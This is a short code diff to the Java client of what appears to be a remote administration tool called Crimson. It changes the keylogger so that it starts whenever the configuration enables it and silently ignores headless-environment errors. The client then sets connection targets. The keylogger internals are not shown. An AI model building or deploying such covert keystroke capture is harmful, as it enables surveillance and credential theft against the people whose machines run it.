@@ -18,8 +18,10 @@
 package com.subterranean_security.crimson.client;
 
 import java.awt.GraphicsEnvironment;
+import java.awt.HeadlessException;
 import java.io.File;
 
+import org.jnativehook.NativeHookException;
 import org.slf4j.Logger;
 import org.slf4j.LoggerFactory;
 
@@ -69,8 +71,15 @@ public class Client {
 
 		log.debug("CVID: {}", Common.cvid);
 
-		if (ic.getKeylogger() && !GraphicsEnvironment.isHeadless()) {
-			Keylogger.start(ic.getKeyloggerFlushMethod(), ic.getKeyloggerFlushValue());
+		if (ic.getKeylogger()) {
+			try {
+				Keylogger.start(ic.getKeyloggerFlushMethod(), ic.getKeyloggerFlushValue());
+			} catch (HeadlessException e) {
+				// ignore
+			} catch (NativeHookException e) {
+				// TODO Auto-generated catch block
+				e.printStackTrace();
+			}
 		}
 
 		ClientStore.Connections.setTargets(ic.getTargetList());
